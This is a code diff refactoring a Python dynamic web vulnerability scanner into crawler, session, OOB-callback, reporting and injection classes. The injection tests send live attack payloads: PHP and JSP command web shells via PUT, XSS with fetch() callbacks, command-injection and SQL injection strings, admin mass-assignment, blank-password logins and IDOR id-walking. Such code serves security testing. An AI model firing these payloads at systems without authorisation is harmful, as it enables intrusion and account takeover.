-                self.vulnerabilities = prev_state['vulnerabilities'] if isinstance(prev_state['vulnerabilities'], list) else []
-                self.crawled_pages = prev_state['crawled_pages'] if isinstance(prev_state['crawled_pages'], list) else []
-                self.log(f"Resumed scan with {len(self.visited_urls)} URLs, {len(self.parameters)} parameters")
-        
-        # Restore state from GUI checkpoint if available
-        checkpoint_data = self.config.get('checkpoint_data')
-        if checkpoint_data and checkpoint_data.get('target') == self.target:
-            self.visited_urls = set(checkpoint_data.get('visited_urls', []))
-            self.vulnerabilities = checkpoint_data.get('vulnerabilities', [])
-            self.log(f"Restored from checkpoint: {len(self.visited_urls)} URLs, {len(self.vulnerabilities)} vulnerabilities")
-        
-        self.async_session = AsyncSession(loop=self.loop)
-        
-        # Initialize Validation Engine with async session
-        if self.validation_enabled:
-            self.validation_engine = ValidationEngine(self.async_session.session, self.config)
-            self.log("Validation Engine initialized for 3x validation and remediation testing")
-        
-        if self.config.get('js_render', True):
-            self.selenium_driver = JSRenderDriver(proxy=self.config.get('proxy'))
-            if not self.selenium_driver.create():
-                self.log("JS rendering unavailable.")
-            else:
-                self.selenium_ready = True
-        # Authentication (async using aiohttp)
-        if self.config.get('auth_steps'):
-            await self._perform_authentication()
-        if self.config.get('cookies'):
-            # Load cookies into async session
-            for cookie in self.config['cookies']:
-                self.async_session.session.cookie_jar.update_cookies(cookie)
+    def allow_request(self) -> bool:
+        """Check if request is allowed based on circuit state"""
+        with self.lock:
+            if self.state == 'closed':
+                return True
+            elif self.state == 'open':
+                # Check if cooldown period has passed
+                if self.last_failure_time and time.time() - self.last_failure_time >= self.cooldown:
+                    self.state = 'half-open'
+                    logging.info("Circuit breaker transitioning to half-open")
+                    return True
+                return False
+            elif self.state == 'half-open':
+                return True
+        return False
+    
+    def get_backoff_delay(self, attempt: int) -> int:
+        """Calculate exponential backoff delay for retry attempt"""
+        return min(2 ** attempt, 30)  # Cap at 30 seconds
 
-    async def _perform_authentication(self):
-        """Perform authentication steps using async aiohttp"""
-        auth_steps = self.config.get('auth_steps', [])
-        for step in auth_steps:
-            url = step.get('url')
-            method = step.get('method', 'GET')
-            data = step.get('data')
-            json_data = step.get('json')
-            headers = step.get('headers', {})
-            try:
-                resp = await self._async_fetch(url, method=method, data=data, json_data=json_data, headers=headers)
-                if resp and resp.status == 200:
-                    self.log(f"Authentication step succeeded: {method} {url}")
-                else:
-                    self.log(f"Authentication step failed: {method} {url} - Status: {resp.status if resp else 'No response'}")
-            except Exception as e:
-                logging.warning(f"Authentication error: {e}")
+# ---------------------------------------------------------------------
+# CRAWLER ENGINE
+# ---------------------------------------------------------------------
+class CrawlerEngine:
+    """Handles web crawling, link extraction, and parameter discovery"""
 
-    async def scan(self):
-        self.log(LEGAL_BANNER)
-        await self.setup()
-        
-        # Estimate total tasks for progress tracking
-        estimated_urls = self.config.get('depth', DEFAULT_DEPTH) * 50  # Rough estimate
-        estimated_params = estimated_urls * 5  # Rough estimate
-        self.total_tasks = estimated_urls + estimated_params + 10  # +10 for other tests
-        self.current_task = 0
-        
-        await self.crawl()
-        self.log(f"Crawled {len(self.visited_urls)} URLs, found {len(self.parameters)} parameters.")
-        await self.discover_websocket_endpoints()
-        await self.discover_grpc_endpoints()
-        await self.test_graphql()
-        await self.test_jwts()
-        await self.run_active_tests()
-        await self.run_idor_tests()
-        await self.test_org_user_id_mismatch()
-        await self.test_role_hierarchy_escalation()
-        await self.test_array_bulk_idor()
-        await self.run_mass_assignment_tests()
-        await self.run_csrf_checks()
-        await self.run_cors_checks()
-        await self.run_http_method_tests()
-        # Save state for resumability
-        if self.config.get('save_state'):
-            self.scan_state_manager.save_state(self.target, self.visited_urls, self.parameters, self.vulnerabilities, self.crawled_pages, self.config)
-            self.log("Scan state saved for resumption.")
-        self.finalize()
-        await self.async_session.close()
-        if self.selenium_driver:
-            self.selenium_driver.quit()
+    def __init__(self, target: str, config: Dict[str, Any], base_domain: str, exclusion_patterns: List[str], circuit_breaker: CircuitBreaker) -> None:
+        self.target = target
+        self.config = config
+        self.base_domain = base_domain
+        self.exclusion_patterns = exclusion_patterns
+        self.circuit_breaker = circuit_breaker
+        self.visited_urls: Set[str] = set()
+        self.crawled_pages: List[Dict[str, Any]] = []
+        self.parameters: List[Dict[str, Any]] = []
+        self.stop_event = asyncio.Event()
 
-    def finalize(self):
-        """Cleanup resources and stop OOB servers"""
-        self.log("Finalizing scan...")
-        
-        # Stop OOB HTTP server
-        if self.oob_server:
-            try:
-                self.oob_server.shutdown()
-                PortAllocator.release_port(self.oob_port)
-                self.log(f"OOB HTTP server stopped (port {self.oob_port})")
-            except Exception as e:
-                logging.warning(f"Error stopping OOB HTTP server: {e}")
-        
-        # Stop advanced OOB servers if enabled
-        if self.enable_advanced_oob:
-            # Stop SMTP OOB handler
-            if self.smtp_oob_handler:
-                try:
-                    self.smtp_oob_handler.stop()
-                    self.log("SMTP OOB server stopped")
-                except Exception as e:
-                    logging.warning(f"Error stopping SMTP OOB server: {e}")
-            
-            # Stop ICMP OOB listener
-            if self.icmp_oob_listener:
-                try:
-                    self.icmp_oob_listener.stop()
-                    self.log("ICMP OOB listener stopped")
-                except Exception as e:
-                    logging.warning(f"Error stopping ICMP OOB listener: {e}")
-            
-            # Stop HTTPS OOB server
-            if self.https_oob_server:
-                try:
-                    self.https_oob_server.shutdown()
-                    PortAllocator.release_port(self.https_oob_port)
-                    self.log(f"OOB HTTPS server stopped (port {self.https_oob_port})")
-                except Exception as e:
-                    logging.warning(f"Error stopping OOB HTTPS server: {e}")
-        
-        # Close FP database
-        if self.fp_db:
-            try:
-                self.fp_db.close()
-            except Exception as e:
-                logging.warning(f"Error closing FP database: {e}")
-        
-        self.log("Scan finalized.")
-
-    async def crawl(self):
-        queue = deque([(self.target, 0)])
-        while queue and not self.stop_event.is_set():
-            url, depth = queue.popleft()
-            if any(p.search(url) for p in self.exclusion_patterns):
-                continue
-            if url in self.visited_urls or depth > self.config.get('depth', DEFAULT_DEPTH):
-                continue
-            self.visited_urls.add(url)
-            self.current_task += 1
-            self.update_progress(self.current_task, self.total_tasks)
-            if hasattr(self.signals, 'status'):
-                self.signals.status.emit(f"Crawling {url}")
-            else:
-                logging.info(f"Crawling {url}")
-            resp = await self._async_fetch(url)
-            if resp and resp.status == 200:
-                html = resp._body
-                soup = BeautifulSoup(html, 'html.parser')
-                self.crawled_pages.append({'url': url, 'html': html, 'soup': soup, 'headers': dict(resp.headers)})
-                self._passive_checks(resp)
-                links = self._extract_links(soup, url, html)
-                for l in links:
-                    if l not in self.visited_urls:
-                        queue.append((l, depth + 1))
-                self._extract_parameters(url, html, soup)
-                # Potential CSRF
-                for form in soup.find_all('form', method=lambda m: m and m.lower() == 'post'):
-                    if not form.find('input', attrs={'name': re.compile(r'csrf|token|nonce', re.I)}):
-                        self._add_vulnerability({
-                            "type": "CSRF (potential)", "url": url, "parameter": "form",
-                            "evidence": "POST form without CSRF token", "severity": "Medium", "confidence": 65,
-                            "cwe": CWE_MAP["CSRF"]
-                        })
-            # JS rendering
-            if self.selenium_ready:
-                rendered = await self.loop.run_in_executor(None, self.selenium_driver.get, url)
-                if rendered:
-                    alerts = self.selenium_driver.check_alerts()
-                    if alerts:
-                        v = Detector.dom_xss(None, self.selenium_driver, '', '')
-                        if v: self._add_vulnerability(v)
-                    await self._process_cdp_responses(queue, depth)
-                    rendered_soup = BeautifulSoup(rendered, 'html.parser')
-                    js_links = self._extract_links(rendered_soup, url, rendered)
-                    for l in js_links:
-                        if l not in self.visited_urls:
-                            queue.append((l, depth + 1))
-                    self._extract_parameters(url, rendered, rendered_soup)
-                    # SPA route clicking
-                    if self.config.get('spa_crawling', True):
-                        spa_routes = await self.loop.run_in_executor(None, self.selenium_driver.click_spa_routes, url)
-                        for spa_url in spa_routes:
-                            if spa_url not in self.visited_urls:
-                                queue.append((spa_url, depth + 1))
-
-    async def _process_cdp_responses(self, queue, depth):
-        with self.selenium_driver.lock:
-            captured = list(self.selenium_driver.captured_requests)
-            self.selenium_driver.captured_requests.clear()
-        for req in captured:
-            if req['type'] == 'response' and self._is_in_scope(req['url']):
-                if req['url'] not in self.visited_urls:
-                    queue.append((req['url'], depth + 1))
-                if req.get('body'):
-                    try:
-                        data = json.loads(req['body'])
-                        if isinstance(data, dict):
-                            for key in data.keys():
-                                self._add_param(req['url'], 'GET', key, 'json')
-                        elif isinstance(data, list) and len(data) > 0 and isinstance(data[0], dict):
-                            for key in data[0].keys():
-                                self._add_param(req['url'], 'GET', key, 'json')
-                    except Exception as e:
-                        logging.warning(f"CDP JSON parse error: {e}")
-
-    async def _async_fetch(self, url, method='GET', data=None, json_data=None, headers=None, allow_redirects=False):
-        await self.rate_limiter.wait()
-        
-        kwargs = {'allow_redirects': allow_redirects}
-        if headers: kwargs['headers'] = headers
-        if data: kwargs['data'] = data
-        if json_data: kwargs['json'] = json_data
-        # Proxy rotation
-        proxy = self.proxy_rotator.get_next_proxy()
-        if proxy:
-            kwargs['proxy'] = proxy
-        try:
-            resp = await self.async_session.request(method, url, **kwargs)
-            if self.capture_evidence:
-                resp._evidence = {
-                    'request': {'method': method, 'url': url, 'headers': headers or {}, 'body': data or json_data, 'proxy': proxy},
-                    'response': {'status': resp.status, 'headers': dict(resp.headers), 'body': resp._body[:2000]}
-                }
-            return resp
-        except Exception as e:
-            logging.warning(f"Fetch error {url}: {e}")
-            if proxy:
-                self.proxy_rotator.mark_failed(proxy)
-            return None
-
-    def _is_valid_url(self, url):
+    def _is_valid_url(self, url: str) -> bool:
         """Validate URL has proper structure and resolvable hostname format"""
         try:
             p = urlparse(url)
@@ -3981,26 +3497,23 @@ class OmegaDAST:
                 return False
             if p.scheme not in ('http', 'https'):
                 return False
-            # Reject placeholder/marker URLs commonly used in payloads
-            if 'OOB_MARKER' in url or 'OOB_DNS' in url or 'evil.com' in url:
+            if OOB_MARKER in url or OOB_DNS in url or 'evil.com' in url:
                 return False
-            # Reject localhost/internal IPs unless explicitly testing SSRF
             if p.netloc in ('localhost', '127.0.0.1', '::1') or p.netloc.startswith('127.'):
                 return False
-            # Reject URLs with invalid characters in hostname
             if re.search(r'[^a-zA-Z0-9.\-:_]', p.netloc):
                 return False
             return True
         except Exception:
             return False
-
-    def _is_in_scope(self, url):
+    
+    def _is_in_scope(self, url: str) -> bool:
         if not self._is_valid_url(url):
             return False
         p = urlparse(url)
         return p.netloc == self.base_domain and p.scheme in ('http', 'https')
-
-    def _extract_links(self, soup, base_url, html):
+    
+    def _extract_links(self, soup: Any, base_url: str, html: str) -> List[str]:
         links = set()
         for a in soup.find_all('a', href=True):
             abs_url = urljoin(base_url, a['href'])
@@ -4039,8 +3552,8 @@ class OmegaDAST:
                 abs_url = urljoin(base_url, m)
                 if self._is_in_scope(abs_url): links.add(abs_url)
         return list(links)
-
-    def _extract_parameters(self, url, html, soup):
+    
+    def _extract_parameters(self, url: str, html: str, soup: Any) -> None:
         parsed = urlparse(url)
         for param in parse_qs(parsed.query):
             self._add_param(url, 'GET', param, 'query')
@@ -4060,34 +3573,2178 @@ class OmegaDAST:
         for key in json_keys:
             self._add_param(url, 'POST', key, 'json')
 
-    def _add_param(self, url, method, param, ptype):
+    def _add_param(self, url: str, method: str, param: str, ptype: str) -> None:
         key = (url, method, param)
         if not any(p['url']==url and p['method']==method and p['param']==param for p in self.parameters):
             self.parameters.append({'url':url,'method':method,'param':param,'type':ptype})
 
-    def _passive_checks(self, resp):
+# ---------------------------------------------------------------------
+# SESSION MANAGER
+# ---------------------------------------------------------------------
+class SessionManager:
+    """Manages HTTP sessions, authentication, and cookies"""
+
+    def __init__(self, config: Dict[str, Any], loop: asyncio.AbstractEventLoop, circuit_breaker: CircuitBreaker) -> None:
+        self.config = config
+        self.loop = loop
+        self.circuit_breaker = circuit_breaker
+        self.async_session: Optional[AsyncSession] = None
+        self.secondary_session: Optional[AsyncSession] = None
+        self.rate_limiter = AsyncRateLimiter(config.get('delay', DEFAULT_DELAY))
+        self.proxy_rotator = ProxyRotator(config.get('proxy_list'))
+
+    async def setup(self) -> None:
+        self.async_session = AsyncSession(loop=self.loop)
+
+    async def close(self) -> None:
+        if self.async_session:
+            await self.async_session.close()
+
+    async def fetch(self, url: str, method: str = 'GET', data: Optional[Dict[str, Any]] = None, json_data: Optional[Dict[str, Any]] = None, headers: Optional[Dict[str, str]] = None, allow_redirects: bool = False) -> Optional[Any]:
+        await self.rate_limiter.wait()
+
+        if not self.circuit_breaker.allow_request():
+            logging.warning(f"Circuit breaker is open, skipping request to {url}")
+            return None
+        
+        kwargs = {'allow_redirects': allow_redirects}
+        if headers: kwargs['headers'] = headers
+        if data: kwargs['data'] = data
+        if json_data: kwargs['json'] = json_data
+        proxy = self.proxy_rotator.get_next_proxy()
+        if proxy:
+            kwargs['proxy'] = proxy
+        
+        for attempt in range(self.circuit_breaker.max_retries):
+            try:
+                resp = await self.async_session.request(method, url, **kwargs)
+                self.circuit_breaker.record_success()
+                return resp
+            except Exception as e:
+                logging.warning(f"Fetch error {url} (attempt {attempt + 1}/{self.circuit_breaker.max_retries}): {e}")
+                if attempt < self.circuit_breaker.max_retries - 1:
+                    backoff_delay = self.circuit_breaker.get_backoff_delay(attempt)
+                    logging.info(f"Retrying in {backoff_delay}s...")
+                    await asyncio.sleep(backoff_delay)
+                else:
+                    self.circuit_breaker.record_failure()
+                    if proxy:
+                        self.proxy_rotator.mark_failed(proxy)
+        return None
+    
+    async def perform_authentication(self, auth_steps: List[Dict[str, Any]]) -> Optional[Dict[str, str]]:
+        """Perform authentication steps using async aiohttp"""
+        for step in auth_steps:
+            url = step.get('url')
+            method = step.get('method', 'GET')
+            data = step.get('data')
+            json_data = step.get('json')
+            headers = step.get('headers', {})
+            try:
+                resp = await self.fetch(url, method=method, data=data, json_data=json_data, headers=headers)
+                if resp and resp.status == 200:
+                    logging.info(f"Authentication step succeeded: {method} {url}")
+                else:
+                    logging.warning(f"Authentication step failed: {method} {url} - Status: {resp.status if resp else 'No response'}")
+            except Exception as e:
+                logging.warning(f"Authentication error: {e}")
+    
+    def load_cookies(self, cookies):
+        """Load cookies into async session"""
+        if self.async_session:
+            for cookie in cookies:
+                self.async_session.session.cookie_jar.update_cookies(cookie)
+
+# ---------------------------------------------------------------------
+# OOB MANAGER
+# ---------------------------------------------------------------------
+class OOBManager:
+    """Manages OOB (Out-of-Band) servers for callback detection"""
+
+    def __init__(self, config: Dict[str, Any], public_ip: str) -> None:
+        self.config = config
+        self.public_ip = public_ip
+        self.oob_server: Optional[Any] = None
+        self.oob_port: Optional[int] = None
+        self.oob_dns_ip = config.get('oob_dns_ip')
+        self.oob_dns_domain = config.get('oob_dns_domain', 'oob.example.com')
+        self.oob_marker_base = uuid.uuid4().hex[:8]
+        self.enable_advanced_oob = config.get('enable_advanced_oob', False)
+        self.smtp_oob_handler: Optional[Any] = None
+        self.icmp_oob_listener: Optional[Any] = None
+        self.https_oob_server: Optional[Any] = None
+        self.https_oob_port: Optional[int] = None
+
+    async def setup(self) -> None:
+        """Start all OOB servers"""
+        self.oob_server, self.oob_port = start_oob_server()
+        logging.info(f"OOB HTTP: {self.public_ip}:{self.oob_port}")
+
+        if self.enable_advanced_oob:
+            self.smtp_oob_handler = SMTPOOBHandler()
+            if self.smtp_oob_handler.start():
+                logging.info("SMTP OOB server started on port 2525")
+
+            self.icmp_oob_listener = ICMPOOBListener()
+            if self.icmp_oob_listener.start():
+                logging.info("ICMP OOB listener started")
+
+            self.https_oob_server, self.https_oob_port = start_https_oob_server()
+            if self.https_oob_server:
+                logging.info(f"OOB HTTPS: {self.public_ip}:{self.https_oob_port}")
+
+    def stop(self) -> None:
+        """Stop all OOB servers"""
+        if self.oob_server:
+            try:
+                self.oob_server.shutdown()
+                PortAllocator.release_port(self.oob_port)
+                logging.info(f"OOB HTTP server stopped (port {self.oob_port})")
+            except Exception as e:
+                logging.warning(f"Error stopping OOB HTTP server: {e}")
+        
+        if self.enable_advanced_oob:
+            if self.smtp_oob_handler:
+                try:
+                    self.smtp_oob_handler.stop()
+                    logging.info("SMTP OOB server stopped")
+                except Exception as e:
+                    logging.warning(f"Error stopping SMTP OOB server: {e}")
+            
+            if self.icmp_oob_listener:
+                try:
+                    self.icmp_oob_listener.stop()
+                    logging.info("ICMP OOB listener stopped")
+                except Exception as e:
+                    logging.warning(f"Error stopping ICMP OOB listener: {e}")
+            
+            if self.https_oob_server:
+                try:
+                    self.https_oob_server.shutdown()
+                    PortAllocator.release_port(self.https_oob_port)
+                    logging.info(f"OOB HTTPS server stopped (port {self.https_oob_port})")
+                except Exception as e:
+                    logging.warning(f"Error stopping OOB HTTPS server: {e}")
+
+# ---------------------------------------------------------------------
+# REPORTING ENGINE
+# ---------------------------------------------------------------------
+class ReportingEngine:
+    """Handles vulnerability reporting, CVSS scoring, and export formats"""
+    
+    def __init__(self, config, signals, session_manager=None):
+        self.config = config
+        self.signals = signals
+        self.vulnerabilities = []
+        self.fp_db = FP_Database()
+        self.session_manager = session_manager  # Reuse connection pool for outbound requests
+    
+    def log(self, msg):
+        """Log message - can be overridden by GUI or use default logging"""
+        if hasattr(self.signals, 'log'):
+            self.signals.log.emit(msg)
+        else:
+            logging.info(msg)
+    
+    def add_finding(self, vuln):
+        """Report vulnerability finding - can be overridden by GUI or use default logging"""
+        if hasattr(self.signals, 'finding'):
+            self.signals.finding.emit(vuln)
+        else:
+            logging.info(f"Finding: {vuln}")
+    
+    def update_progress(self, current, total):
+        """Update progress - can be overridden by GUI or use default logging"""
+        if hasattr(self.signals, 'progress'):
+            self.signals.progress.emit(current, total)
+        else:
+            logging.info(f"Progress: {current}/{total}")
+    
+    def calculate_cvss(self, vuln):
+        if not CVSS_AVAILABLE:
+            return None
+        try:
+            vector = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:R/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+            c = CVSS4(vector)
+            return c.score
+        except Exception as e:
+            logging.warning(f"CVSS calculation error: {e}")
+            return None
+    
+    def export_burp_xml(self, report):
+        xml = '<?xml version="1.0"?>\n<issues>\n'
+        for vuln in report['vulnerabilities']:
+            xml += f"""<issue>
+    <serialNumber>{vuln.get('id','')}</serialNumber>
+    <type>{vuln['type']}</type>
+    <name>{vuln['type']}</name>
+    <host ip="unknown">{urlparse(vuln['url']).hostname}</host>
+    <path>{urlparse(vuln['url']).path}</path>
+    <location>{vuln['url']}</location>
+    <severity>{vuln['severity']}</severity>
+    <confidence>{vuln['confidence']}</confidence>
+    <issueDetail>{vuln.get('evidence','')}</issueDetail>
+</issue>\n"""
+        xml += '</issues>'
+        return xml
+    
+    async def send_jira_alert(self, vuln):
+        jira_url = self.config.get('jira_webhook')
+        if jira_url:
+            try:
+                if self.session_manager and self.session_manager.async_session:
+                    # Reuse existing connection pool
+                    async with self.session_manager.async_session.session.request('POST', jira_url, json={"title": f"UltraDAST found {vuln['type']}", "description": json.dumps(vuln)}) as resp:
+                        if resp.status == 200:
+                            self.log(f"JIRA alert sent for {vuln['type']}")
+                else:
+                    # Fallback to new session
+                    async with aiohttp.ClientSession() as session:
+                        await session.post(jira_url, json={"title": f"UltraDAST found {vuln['type']}", "description": json.dumps(vuln)})
+                        self.log(f"JIRA alert sent for {vuln['type']}")
+            except Exception as e:
+                self.log(f"Failed to send JIRA alert: {e}")
+    
+    async def send_slack_alert(self, vuln):
+        slack_url = self.config.get('slack_webhook')
+        if slack_url:
+            try:
+                if self.session_manager and self.session_manager.async_session:
+                    # Reuse existing connection pool
+                    async with self.session_manager.async_session.session.request('POST', slack_url, json={"text": f"*{vuln['type']}* on {vuln['url']}\nEvidence: {vuln.get('evidence','')}"}) as resp:
+                        if resp.status == 200:
+                            self.log(f"Slack alert sent for {vuln['type']}")
+                else:
+                    # Fallback to new session
+                    async with aiohttp.ClientSession() as session:
+                        await session.post(slack_url, json={"text": f"*{vuln['type']}* on {vuln['url']}\nEvidence: {vuln.get('evidence','')}"})
+                        self.log(f"Slack alert sent for {vuln['type']}")
+            except Exception as e:
+                self.log(f"Failed to send Slack alert: {e}")
+    
+    def close(self):
+        if self.fp_db:
+            try:
+                self.fp_db.close()
+            except Exception as e:
+                logging.warning(f"Error closing FP database: {e}")
+
+# ---------------------------------------------------------------------
+# INJECTION ENGINE
+# ---------------------------------------------------------------------
+class InjectionEngine:
+    """Handles all injection-based vulnerability tests (SQLi, XSS, etc.)"""
+    
+    def __init__(self, config, crawler_engine, session_manager, reporting_engine, oob_manager):
+        self.config = config
+        self.crawler_engine = crawler_engine
+        self.session_manager = session_manager
+        self.reporting_engine = reporting_engine
+        self.oob_manager = oob_manager
+        self.baseline_cache = BaselineCache()
+        self.token_normalizer = TokenNormalizer()
+        self.selenium_driver = None
+        self.selenium_ready = False
+        
+        # Initialize missing attributes for async operations
+        self.stop_event = asyncio.Event()
+        self.concurrency_limit = config.get('concurrency_limit', 100)
+        self.semaphore = asyncio.Semaphore(self.concurrency_limit)
+        self.current_task = 0
+        self.total_tasks = 0
+        self.loop = asyncio.get_event_loop()
+        
+        # OOB-related attributes
+        self.enable_advanced_oob = config.get('enable_advanced_oob', False)
+        self.https_oob_port = None
+        self.oob_dns_ip = config.get('oob_dns_ip')
+        self.oob_dns_domain = config.get('oob_dns_domain', 'oob.example.com')
+        self.oob_marker_base = getattr(oob_manager, 'oob_marker_base', uuid.uuid4().hex[:8])
+        self.public_ip = getattr(oob_manager, 'public_ip', '127.0.0.1')
+        self.oob_port = getattr(oob_manager, 'oob_port', 8080)
+        
+        # Scan state manager for second-order tests
+        self.scan_state_manager = ScanStateManager(config.get('state_db', 'scan_state.db'))
+    
+    async def run_tests(self):
+        """Run all injection tests"""
+        await self.run_active_tests()
+        await self.run_idor_tests()
+        await self.test_org_user_id_mismatch()
+        await self.test_role_hierarchy_escalation()
+        await self.test_array_bulk_idor()
+        await self.run_mass_assignment_tests()
+        await self.run_csrf_checks()
+        await self.run_cors_checks()
+        await self.run_http_method_tests()
+
+    # --- Helper methods ---
+    def log(self, msg):
+        """Log message"""
+        logging.info(msg)
+
+    def update_progress(self, current, total):
+        """Update progress"""
+        logging.info(f"Progress: {current}/{total}")
+
+    async def _async_fetch(self, url, method='GET', data=None, json_data=None, headers=None):
+        """Async HTTP fetch with session management"""
+        if not self.session_manager or not self.session_manager.async_session:
+            return None
+        try:
+            async with self.session_manager.async_session.session.request(
+                method, url, data=data, json=json_data, headers=headers, timeout=aiohttp.ClientTimeout(total=30)
+            ) as resp:
+                body = await resp.text()
+                # Store response metadata for detection
+                resp._body = body
+                resp._elapsed = getattr(resp, '_elapsed', 0)
+                return resp
+        except Exception as e:
+            logging.debug(f"Async fetch error for {url}: {e}")
+            return None
+
+    async def _add_vulnerability(self, vuln):
+        """Add vulnerability through reporting engine"""
+        if self.reporting_engine:
+            await self.reporting_engine._add_vulnerability(vuln)
+        else:
+            logging.info(f"Finding: {vuln}")
+
+    # --- HTTP Method Tests ---
+    async def run_http_method_tests(self):
+        """Comprehensive HTTP method vulnerability testing"""
+        self.log("Starting HTTP method vulnerability tests...")
+        
+        # Test URLs from crawled pages
+        test_urls = list(self.crawler_engine.visited_urls)[:20]  # Limit to first 20 URLs for efficiency
+        
+        for url in test_urls:
+            if self.stop_event.is_set():
+                break
+                
+            # Test each HTTP method
+            await self._test_put_method(url)
+            await self._test_patch_method(url)
+            await self._test_post_method(url)
+            await self._test_get_method(url)
+            await self._test_delete_method(url)
+            await self._test_options_method(url)
+            
+            self.current_task += 1
+            self.update_progress(self.current_task, self.total_tasks)
+
+    async def _test_put_method(self, url):
+        """Test PUT method vulnerabilities"""
+        try:
+            baseline_resp = await self._async_fetch(url, method='GET')
+            if not baseline_resp:
+                return
+            
+            # Test file upload payload
+            file_payloads = [
+                '<?php system($_GET["cmd"]); ?>',
+                '<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
+                'DB_PASSWORD=secret123',
+                'test_file_upload.txt',
+            ]
+            
+            for payload in file_payloads:
+                if self.stop_event.is_set():
+                    break
+                    
+                marker = f"{self.oob_marker_base}_{uuid.uuid4().hex[:4]}"
+                test_payload = f"{marker}_{payload}"
+                
+                resp = await self._async_fetch(url, method='PUT', data=test_payload)
+                if resp:
+                    result = Detector.put_file_upload(resp, baseline_resp, url, test_payload)
+                    if result:
+                        await self._add_vulnerability({**result, "url": url, "payload": test_payload})
+                    
+                    result = Detector.put_resource_overwrite(resp, baseline_resp, url)
+                    if result:
+                        await self._add_vulnerability({**result, "url": url, "payload": test_payload})
+                    
+                    # Check OOB callbacks
+                    await asyncio.sleep(0.3)
+                    with oob_results_lock:
+                        for res in oob_results:
+                            if marker in res['path']:
+                                await self._add_vulnerability({
+                                    "type": "PUT OOB Callback",
+                                    "confidence": 95,
+                                    "evidence": f"OOB callback: {res['path']}",
+                                    "url": url,
+                                    "severity": "High"
+                                })
+                                break
+        except Exception as e:
+            logging.warning(f"PUT method test error for {url}: {e}")
+
+    async def _test_patch_method(self, url):
+        """Test PATCH method vulnerabilities"""
+        try:
+            baseline_resp = await self._async_fetch(url, method='GET')
+            if not baseline_resp:
+                return
+            
+            # Test mass assignment payloads
+            mass_assignment_payloads = [
+                '{"is_admin": true, "role": "administrator"}',
+                '{"permissions": ["all", "admin", "superuser"]}',
+                '{"access_level": 99, "is_superuser": true}',
+            ]
+            
+            for payload in mass_assignment_payloads:
+                if self.stop_event.is_set():
+                    break
+                    
+                try:
+                    json_data = json.loads(payload)
+                except json.JSONDecodeError:
+                    json_data = None
+                    resp = await self._async_fetch(url, method='PATCH', data=payload)
+                else:
+                    resp = await self._async_fetch(url, method='PATCH', json_data=json_data)
+                
+                if resp:
+                    result = Detector.patch_mass_assignment(resp, baseline_resp, payload)
+                    if result:
+                        await self._add_vulnerability({**result, "url": url, "payload": payload})
+            
+            # Test validation bypass payloads
+            validation_payloads = [
+                '{"email": "invalid-email-no-at-sign"}',
+                '{"age": -999, "quantity": 999999}',
+                '{"username": "admin\' OR 1=1--"}',
+            ]
+            
+            for payload in validation_payloads:
+                if self.stop_event.is_set():
+                    break
+                    
+                try:
+                    json_data = json.loads(payload)
+                except json.JSONDecodeError:
+                    json_data = None
+                    resp = await self._async_fetch(url, method='PATCH', data=payload)
+                else:
+                    resp = await self._async_fetch(url, method='PATCH', json_data=json_data)
+                    
+                if resp:
+                    result = Detector.patch_validation_bypass(resp, baseline_resp, payload)
+                    if result:
+                        await self._add_vulnerability({**result, "url": url, "payload": payload})
+                        
+        except Exception as e:
+            logging.warning(f"PATCH method test error for {url}: {e}")
+
+    async def _test_post_method(self, url):
+        """Test POST method vulnerabilities"""
+        try:
+            baseline_resp = await self._async_fetch(url, method='GET')
+            if not baseline_resp:
+                return
+            
+            # Test stored XSS payloads
+            xss_payloads = [
+                '<script>alert(document.domain)</script>',
+                '<img src=x onerror=alert(1)>',
+                '<body onload=alert(1)>',
+            ]
+            
+            for payload in xss_payloads:
+                if self.stop_event.is_set():
+                    break
+                    
+                marker = f"{self.oob_marker_base}_{uuid.uuid4().hex[:4]}"
+                oob_url = f"http://{self.public_ip}:{self.oob_port}/{marker}"
+                test_payload = payload.replace('alert(1)', f'fetch("{oob_url}")')
+                
+                resp = await self._async_fetch(url, method='POST', data={'test': test_payload})
+                if resp:
+                    result = Detector.post_stored_xss(resp, baseline_resp, test_payload, oob_results, marker)
+                    if result:
+                        await self._add_vulnerability({**result, "url": url, "payload": test_payload})
+            
+            # Test authentication bypass
+            auth_payloads = [
+                {'username': '', 'password': ''},
+                {'username': 'admin', 'password': ''},
+                {'user': 'admin', 'pass': 'any'},
+            ]
+            
+            for payload in auth_payloads:
+                if self.stop_event.is_set():
+                    break
+                    
+                resp = await self._async_fetch(url, method='POST', data=payload)
+                if resp:
+                    result = Detector.post_auth_bypass(resp, baseline_resp, url)
+                    if result:
+                        await self._add_vulnerability({**result, "url": url, "payload": str(payload)})
+            
+            # Test command injection
+            cmd_payloads = [
+                ';id',
+                '|whoami',
+                '&&dir',
+                '||ping -c 1 127.0.0.1',
+            ]
+            
+            for payload in cmd_payloads:
+                if self.stop_event.is_set():
+                    break
+                    
+                resp = await self._async_fetch(url, method='POST', data={'cmd': payload})
+                if resp:
+                    result = Detector.post_command_injection(resp, baseline_resp, payload)
+                    if result:
+                        await self._add_vulnerability({**result, "url": url, "payload": payload})
+                        
+        except Exception as e:
+            logging.warning(f"POST method test error for {url}: {e}")
+
+    async def _test_get_method(self, url):
+        """Test GET method vulnerabilities"""
+        try:
+            baseline_resp = await self._async_fetch(url, method='GET')
+            if not baseline_resp:
+                return
+            
+            # Test IDOR by manipulating IDs in URL
+            id_pattern = re.search(r'/(\d+)', url)
+            if id_pattern:
+                original_id = id_pattern.group(1)
+                test_ids = [str(int(original_id) + 1), str(int(original_id) - 1), '99999']
+                
+                for test_id in test_ids:
+                    if self.stop_event.is_set():
+                        break
+                        
+                    test_url = url.replace(f'/{original_id}', f'/{test_id}')
+                    resp = await self._async_fetch(test_url, method='GET')
+                    if resp:
+                        result = Detector.get_idor(resp, baseline_resp, test_url, test_id)
+                        if result:
+                            await self._add_vulnerability({**result, "url": test_url})
+            
+            # Test parameter pollution
+            parsed = urlparse(url)
+            if parsed.query:
+                params = parse_qs(parsed.query)
+                polluted_params = []
+                for key, values in params.items():
+                    polluted_params.append((key, values[0]))
+                    polluted_params.append((key, 'polluted_value'))
+                
+                polluted_url = urlunparse(parsed._replace(query=urlencode(polluted_params, doseq=True)))
+                resp = await self._async_fetch(polluted_url, method='GET')
+                if resp:
+                    result = Detector.get_parameter_pollution(resp, baseline_resp, polluted_url)
+                    if result:
+                        await self._add_vulnerability({**result, "url": polluted_url})
+            
+            # Test cache poisoning potential
